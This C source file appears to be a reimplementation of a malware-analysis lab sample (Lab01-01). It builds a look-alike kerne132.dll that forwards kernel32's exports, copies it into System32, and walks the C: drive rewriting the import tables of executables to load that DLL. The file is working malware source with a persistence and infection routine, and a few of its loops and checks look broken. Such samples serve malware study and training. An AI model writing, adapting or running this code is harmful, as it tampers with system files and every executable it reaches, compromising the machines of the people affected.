
#include <string.h>
#include <windows.h>

char* aWarning = "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE";
char* kernel32path = "C:\\Windows\\System32\\Kernel32.dll";
char* dll = "Lab01-01.dll";
char* kerne132path = "C:\\Windows\\System32\\kerne132.dll";
char* kerne132 = "kerne132.dll";
char* kernel32 = "kernel32.dll";
char* forwardExportStart = "Kernel32.";
char* dirWildcard = "\\*";
char* exe = ".exe";


LPVOID rva2va(DWORD rva, PIMAGE_NT_HEADERS ntHdrs, LPVOID base);

long long SubGenForRVA(DWORD rva, PIMAGE_NT_HEADERS ntHdrs, LPVOID base);

void infection(char* pathWildCard, int depth);

void corruptPE(char* path);

BOOL SafeRead(LPVOID pointer, LPVOID storage, size_t size);

PIMAGE_SECTION_HEADER GetSectionByRVA(DWORD rva, PIMAGE_NT_HEADERS ntHdrs);

int main (int argc, char* argv[]){
	// NOTE: THIS IS NOT A ONE TO ONE TRANSLATION 
	// CODE WAS CHANGED TO FIT CORRECT API USAGE 
	// AND TO LOOK MORE INTUITIVE 
	
	HANDLE hFile = NULL, hMapping = NULL;
	LPVOID mappingKernel32 = NULL, mappingDll = NULL;
	DWORD exportDirRVA;
	PIMAGE_EXPORT_DIRECTORY kernel32ExportDir, dllExportDir;
	PIMAGE_NT_HEADERS kernel32Hdrs, dllHdrs;
	BOOL result;
	BOOL success = FALSE;
	
	if (argc != 2){
		goto epilog;
	}
	if (strcmp(aWarning, argv[1]) != 0){ // sanity check 
		goto epilog;
	}	
	hFile = CreateFileA(kernel32path, GENERIC_READ, 
		FILE_SHARE_READ, NULL , OPEN_EXISTING, 0, NULL);
		
	if (hFile == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	hMapping = CreateFileMappingA(hFile, NULL,
		PAGE_READONLY, 0, 0, NULL);	
	if (hMapping == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	mappingKernel32 = MapViewOfFile(hMapping, FILE_MAP_READ,
		0, 0, 0);	
	if (mappingKernel32 == NULL){
		goto epilog;
	}
	CloseHandle(hFile);
	
	hFile = CreateFileA(dll, MAXIMUM_ALLOWED,	
		FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	
	if (hFile == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	CloseHandle(hMapping);
	
	hMapping = CreateFileMappingA(hFile, NULL,
		PAGE_READWRITE, 0, 0, NULL);
	
	if (hMapping == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	mappingDll = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS,
		0, 0, 0);
	
	if (mappingDll == NULL){
		goto epilog;
	}
	
	kernel32Hdrs = (PIMAGE_NT_HEADERS)
		(mappingKernel32 + ((PIMAGE_DOS_HEADER)mappingKernel32)->e_lfanew);
	
	exportDirRVA = kernel32Hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	kernel32ExportDir = (PIMAGE_EXPORT_DIRECTORY)rva2va(exportDirRVA, kernel32Hdrs, mappingKernel32);
	
	dllHdrs = (PIMAGE_NT_HEADERS)
		(mappingDll + ((PIMAGE_DOS_HEADER)mappingDll)->e_lfanew);
	
	exportDirRVA = dllHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	long long subGen = SubGenForRVA(exportDirRVA, dllHdrs, mappingDll);
	
	dllExportDir = (PIMAGE_EXPORT_DIRECTORY)rva2va(exportDirRVA, dllHdrs, mappingDll);
	
	LPVOID kernel32Functions = rva2va(kernel32ExportDir->AddressOfFunctions, 
		kernel32Hdrs, mappingKernel32);
	
	LPVOID kernel32NameOrdinals = rva2va(kernel32ExportDir->AddressOfNameOrdinals,
		kernel32Hdrs, mappingKernel32);
	
	LPVOID kernel32Names = rva2va(kernel32ExportDir->AddressOfNames,
		kernel32Hdrs, mappingKernel32);
	
	int dllExportDirSize = dllHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;	
	
	memcpy(dllExportDir, kernel32ExportDir, dllExportDirSize);
	
	dllExportDir->NumberOfFunctions = kernel32ExportDir->NumberOfFunctions;
	dllExportDir->NumberOfNames = kernel32ExportDir->NumberOfNames;
	
	LPVOID currDataAddress = (LPVOID)dllExportDir;
	
	currDataAddress += sizeof(IMAGE_EXPORT_DIRECTORY);
	
	dllExportDir->Name = (long long)currDataAddress + subGen;
	
	memcpy(currDataAddress,kerne132, strlen(kerne132) + 1); // copy null terminator 
	
	currDataAddress += 16;
	
	LPVOID dllFunctionsTable = currDataAddress;
	
	dllExportDir->AddressOfFunctions = (long long)dllFunctionsTable + subGen;
	
	DWORD numFunctions = dllExportDir->NumberOfFunctions;
	
	currDataAddress += numFunctions * 4;
	
	LPVOID dllNameOrdinalsTable = currDataAddress;
	
	dllExportDir->AddressOfNameOrdinals = (long long)dllNameOrdinalsTable + subGen;
	
	currDataAddress += numFunctions * 4; 
	
	LPVOID dllNamesTable = currDataAddress;
	
	dllExportDir->AddressOfNames = (long long)dllNamesTable + subGen;
	
	currDataAddress += numFunctions * 8;
	char* currName;
	for (DWORD i = 0; i < dllExportDir->NumberOfNames; i++){
		 // TODO: fix this loop 
			((WORD*)dllNameOrdinalsTable)[i] = (WORD)i;
			
			((LPVOID*)dllFunctionsTable)[i] = currDataAddress; // forward export 		
			
			memcpy(currDataAddress, forwardExportStart, strlen(forwardExportStart));
			
			currDataAddress += strlen(forwardExportStart);	
			
			((char**)dllNamesTable)[i] = (char*)currDataAddress;
			
			currName = ((char**)kernel32Names)[i];
				
			memcpy(currDataAddress, currName, strlen(currName) + 1); // null terminator
			
			currDataAddress += strlen(currName);
			
			// origin copied name twice, once for the names table and once for the forward export 
			// the reason is beyond me 	
	}
	result = CopyFileA(dll, kerne132path, FALSE);	
	if (result == FALSE){
		goto epilog;
	}
	success = TRUE;
	
	epilog:
	if (hFile && hFile != INVALID_HANDLE_VALUE){
		CloseHandle(hFile);
	}
	if (hMapping && hMapping != INVALID_HANDLE_VALUE){
		CloseHandle(hMapping);
	}
	if (mappingKernel32){
		UnmapViewOfFile(mappingKernel32);
	}
	if (mappingDll){
		UnmapViewOfFile(mappingDll);
	}
	if (success){
		infection("C:\\*", 0);
	}
		
	return 0;
	
}


LPVOID rva2va(DWORD rva, PIMAGE_NT_HEADERS ntHdrs, LPVOID base){
	
	PIMAGE_SECTION_HEADER sect = GetSectionByRVA(rva, ntHdrs);
	if (sect == NULL){
		return NULL;
	}
	return base + rva + sect->PointerToRawData - sect->VirtualAddress;
}

PIMAGE_SECTION_HEADER GetSectionByRVA(DWORD rva, PIMAGE_NT_HEADERS ntHdrs){
	PIMAGE_SECTION_HEADER pSectHdrs;
	pSectHdrs = (PIMAGE_SECTION_HEADER)
		(ntHdrs + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHdrs->FileHeader.SizeOfOptionalHeader);
		
	WORD numSections = ntHdrs->FileHeader.NumberOfSections;
	DWORD sectAddr;
	DWORD sectSize;
	
	for (WORD i = 0; i < numSections; i++){
		sectAddr = pSectHdrs->VirtualAddress;
		sectSize = pSectHdrs->SizeOfRawData; // origin used VirtualSize which is incorrect		
		if (rva > sectAddr && rva < sectAddr + sectSize){
			return pSectHdrs;
		}
		
		pSectHdrs++;
	}
	
	return NULL;
}

long long SubGenForRVA(DWORD rva, PIMAGE_NT_HEADERS ntHdrs, LPVOID base){
	// used when constructing the export directory
	// you need to know what to substract from va's to get their rva 
	
	PIMAGE_SECTION_HEADER sect = GetSectionByRVA(rva, ntHdrs);
	if (sect == NULL){
		return 0;
	}
	return sect->VirtualAddress - sect->PointerToRawData - (long long)base;
}


void infection(char* path, int depth){
	char storage[MAX_PATH];
	HANDLE hFindFile = NULL;
	WIN32_FIND_DATAA fileData;
	if (depth > 7){
		return;
	}
	hFindFile = FindFirstFileA(path, &fileData);
	if (hFindFile == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	do {
		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
			goto loc_40135C;
		}
		memcpy(storage, fileData.cFileName, strlen(fileData.cFileName) + 1);
		if (strcmp(storage + strlen(storage) - 4, exe)){
			corruptPE(storage);
		}
		loc_40135C:
		memcpy(storage, fileData.cFileName, strlen(fileData.cFileName));
		memcpy(storage, dirWildcard, strlen(dirWildcard) + 1);
		infection(storage, depth+1); // recursion
		
	} while(FindNextFileA(hFindFile, &fileData));
	
	epilog:
	if (hFindFile && hFindFile != INVALID_HANDLE_VALUE){
		FindClose(hFindFile);
	}
	
}

void corruptPE(char* path){
	HANDLE hFile = NULL, hMapping = NULL;
	LPVOID mappingFile;
	PIMAGE_NT_HEADERS fileNtHdrs;
	PIMAGE_IMPORT_DESCRIPTOR fileImportDir;
	char* currDllName;
	
	hFile = CreateFileA(path, MAXIMUM_ALLOWED, FILE_SHARE_READ,
		NULL, OPEN_EXISTING,0, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	hMapping = CreateFileMappingA(hFile, NULL,
		PAGE_READWRITE, 0, 0, NULL);
	
	if (hMapping == INVALID_HANDLE_VALUE){
		goto epilog;
	}
	
	mappingFile = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS,
		0, 0, 0);
	
	if (mappingFile == NULL){
		goto epilog;
	}
	if (IsBadReadPtr(mappingFile + ((PIMAGE_DOS_HEADER)0)->e_lfanew, 4)){
		goto epilog;
	}
	fileNtHdrs = (PIMAGE_NT_HEADERS)
		(mappingFile + ((PIMAGE_DOS_HEADER)mappingFile)->e_lfanew);
	DWORD signature;
	signature = *(DWORD*)fileNtHdrs;
	if (signature != 0x4550){
		goto epilog;
	}
	DWORD importDirRVA = fileNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;	
	
	fileImportDir = (PIMAGE_IMPORT_DESCRIPTOR)rva2va(importDirRVA, fileNtHdrs,mappingFile);
	
	if (IsBadReadPtr(fileImportDir, sizeof(IMAGE_IMPORT_DESCRIPTOR))){
		goto epilog;
	}
	while (fileImportDir->Name){
		currDllName = (char*)rva2va(fileImportDir->Name, fileNtHdrs, mappingFile);
		if (IsBadReadPtr(currDllName, strlen(kernel32))){ 
			goto epilog;
		}
		if (stricmp(kernel32, currDllName) != 0){
			continue;
		}
		memcpy(currDllName, kerne132, strlen(kerne132));
		// origin didn't break here 
	}
	epilog:
	if (hFile && hFile != INVALID_HANDLE_VALUE){
		CloseHandle(hFile);
	}
	if (hMapping && hMapping != INVALID_HANDLE_VALUE){
		CloseHandle(hMapping);
	}
	if (mappingFile){
		UnmapViewOfFile(mappingFile);
	}
}
